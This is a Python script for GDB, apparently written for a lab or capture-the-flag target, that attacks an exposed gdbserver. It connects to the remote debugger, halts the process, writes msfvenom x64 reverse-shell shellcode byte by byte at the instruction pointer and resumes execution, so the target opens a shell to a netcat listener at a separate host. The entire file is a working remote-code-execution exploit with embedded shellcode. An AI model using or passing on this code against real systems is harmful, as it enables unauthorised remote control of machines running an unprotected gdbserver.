import gdb
import socket
import struct
import sys
import binascii

# host and port of the gdbserver instance
gdbserver = '10.10.11.125', 1337

# host and port of the netcat listener
netcat = '10.10.14.4', 1234


def progress(fmt, *args):
    sys.stdout.write(fmt % args + '\n')
    gdb.flush(gdb.STDOUT)


def reverse_shell(netcat):
    ip, port = netcat
    """
        custom shellcode using msfvenom for 64bit system
        msfvenom -p linux/x64/shell_reverse_tcp lhost=<ip> lport=<port> -f hex
    """
    sc = '6a2958996a025f6a015e0f05489748b9020004d20a0a0e04514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05'
    sc = binascii.unhexlify(sc)
    return sc

gdb.execute('set confirm off')
gdb.execute('set verbose off')

progress('[x] Connecting to %s:%d', gdbserver[0], gdbserver[1])
gdb.execute('target extended-remote %s:%d' % gdbserver)

progress('[x] Installing invalid breakpoint')
bp = gdb.Breakpoint('*0', internal=True)

progress('[x] Running..')
try:
    gdb.execute('run')
except gdb.error as e:
    pass

progress('[x] Deleting invalid breakpoint')
bp.delete()

for idx, ch in enumerate(reverse_shell(netcat)):
    gdb.execute('set *(unsigned char *)($rip + %d) = %d' % (idx, int(ch)))
gdb.execute('continue')
gdb.execute('continue')
